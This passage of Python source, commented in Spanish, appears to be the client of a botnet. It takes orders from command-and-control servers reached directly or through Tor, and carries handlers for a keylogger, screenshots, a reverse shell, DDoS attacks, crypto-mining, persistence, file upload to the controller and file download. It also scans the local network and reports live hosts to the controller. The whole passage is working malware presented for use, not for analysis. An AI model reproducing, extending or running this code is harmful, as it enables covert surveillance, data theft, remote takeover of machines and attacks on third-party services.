                status = f"keylogger_started:{result}" if success else f"keylogger_failed:{result}"
                c2_socket.sendall(json.dumps({'action': 'response', 'status': status}).encode('utf-8'))
                print(f"\033[92m[*] Keylogger: {status}\033[0m")
            
            elif command['action'] == 'screenshot':
                success, data = take_screenshot()
                c2_socket.sendall(json.dumps({
                    'action': 'screenshot_response',
                    'success': success,
                    'data': data
                }).encode('utf-8'))
                print(f"\033[92m[*] Screenshot {'capturado' if success else 'falló'}\033[0m")
            
            elif command['action'] == 'reverse_shell':
                c2_ip = command.get('c2_ip', C2_IP)
                success, msg = start_reverse_shell(c2_ip)
                c2_socket.sendall(json.dumps({'action': 'response', 'status': f'shell:{msg}'}).encode('utf-8'))
            
            elif command['action'] == 'ddos':
                target = command.get('target', '')
                port = command.get('port', 80)
                duration = command.get('duration', 60)
                
                # Ejecutar DDoS en thread separado
                ddos_thread = threading.Thread(
                    target=lambda: c2_socket.sendall(json.dumps({
                        'action': 'response',
                        'status': f'ddos_result:{ddos_attack(target, port, duration)[1]}'
                    }).encode('utf-8')),
                    daemon=True
                )
                ddos_thread.start()
                print(f"\033[91m[*] DDoS iniciado contra {target}:{port}\033[0m")
            
            elif command['action'] == 'mine':
                mining_thread = threading.Thread(target=crypto_miner_simulate, daemon=True)
                mining_thread.start()
                c2_socket.sendall(json.dumps({'action': 'response', 'status': 'mining_started'}).encode('utf-8'))
            
            elif command['action'] == 'persist':
                success, msg = install_persistence()
                c2_socket.sendall(json.dumps({'action': 'response', 'status': f'persistence:{msg}'}).encode('utf-8'))
                print(f"\033[92m[*] Persistencia: {msg}\033[0m")
            
            elif command['action'] == 'upload':
                file_path = command.get('file_path', '')
                success, msg = upload_file(file_path, c2_socket)
                print(f"\033[96m[*] Upload: {msg}\033[0m")
            
            elif command['action'] == 'download':
                url = command.get('url', '')
                dest = command.get('dest', '/tmp/downloaded_file')
                success, msg = download_file(url, dest)
                c2_socket.sendall(json.dumps({'action': 'response', 'status': f'download:{msg}'}).encode('utf-8'))

        except json.JSONDecodeError as e:
            print(f"[!] Error JSON: {e}")
        except KeyError as e:
            print(f"[!] Falta campo en comando: {e}")
        except Exception as e:
            print(f"[!] Error procesando comando: {e}")
            import traceback
            traceback.print_exc()
            break

def create_tor_connection(host, port):
    """Crea conexión a través de Tor SOCKS5."""
    import socks
    
    tor_socket = socks.socksocket()
    tor_socket.set_proxy(socks.SOCKS5, TOR_PROXY[0], TOR_PROXY[1])
    tor_socket.connect((host, port))
    return tor_socket

def try_connect_to_server(server_config, context, system_info):
    """Intenta conectar a un servidor C2."""
    global C2_IP, C2_PORT, USE_TOR
    
    C2_IP = server_config['ip']
    C2_PORT = server_config['port']
    USE_TOR = server_config['use_tor']
    
    connection_type = "🧅 Tor (.onion)" if USE_TOR else "🌐 Direct IP"
    print(f"[*] Intentando {connection_type}: {C2_IP}:{C2_PORT}...")
    
    if USE_TOR:
        print(f"[*] Usando Tor SOCKS5 proxy en {TOR_PROXY[0]}:{TOR_PROXY[1]}...")
        try:
            sock = create_tor_connection(C2_IP, C2_PORT)
        except ImportError:
            print("[!] PySocks no instalado. Instalando...")
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-q', 'PySocks'])
            import socks
            sock = create_tor_connection(C2_IP, C2_PORT)
    else:
        sock = socket.create_connection((C2_IP, C2_PORT), timeout=10)
    
    ssock = context.wrap_socket(sock, server_hostname=C2_IP)
    
    # Handshake
    handshake = {'action': 'handshake', 'info': system_info}
    ssock.sendall(json.dumps(handshake).encode('utf-8'))
    
    print(f"\033[92m[✓] Conectado a C2 via {connection_type}\033[0m")
    return ssock

def main():
    """Función principal con fallback automático IP → .onion."""
    global bot_state
    
    # Intentar descargar configuración actualizada al inicio
    print("[*] Descargando configuración de C2s...")
    download_c2_config()
    
    # Iniciar thread de actualización periódica
    update_thread = threading.Thread(target=update_config_loop, daemon=True)
    update_thread.start()
    
    system_info = get_system_info()
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    current_server_index = 0
    retry_count = 0

    while True:
        try:
            server = C2_SERVERS[current_server_index]
            ssock = try_connect_to_server(server, context, system_info)
            
            # Reset retry counter on successful connection
            retry_count = 0
            
            with ssock:
                listener_thread = threading.Thread(target=listen_for_commands, args=(ssock,), daemon=True)
                listener_thread.start()
                
                while True:
                    if bot_state['status'] == 'RECON':
                        local_ip_parts = system_info['ip'].split('.')
                        if len(local_ip_parts) == 4:
                            network_range = f"{local_ip_parts[0]}.{local_ip_parts[1]}.{local_ip_parts[2]}.0/24"
                        else:
                            network_range = "127.0.0.0/24"
                        
                        bot_state['report'] = {
                            'action': 'report',
                            'bot_id': system_info['id'],
                            'live_hosts': scan_network(network_range)
                        }
                        ssock.sendall(json.dumps(bot_state['report']).encode('utf-8'))
                        print("[*] Informe enviado. Modo IDLE")
                        bot_state['status'] = 'IDLE'
                    
                    time.sleep(10)

        except Exception as e:
            retry_count += 1
            print(f"\033[91m[!] Error conectando: {e}\033[0m")
            
            # Si alcanzamos max retries, cambiar al siguiente servidor
            if retry_count >= MAX_RETRIES_PER_SERVER:
                current_server_index = (current_server_index + 1) % len(C2_SERVERS)
                retry_count = 0
                
                next_server = C2_SERVERS[current_server_index]
                server_type = ".onion" if next_server['use_tor'] else "IP directa"
                print(f"\033[93m[*] Cambiando a servidor backup ({server_type})...\033[0m")
                time.sleep(5)
            else:
                print(f"[*] Reintento {retry_count}/{MAX_RETRIES_PER_SERVER} en 10s...")
                time.sleep(10)

if __name__ == "__main__":
    main()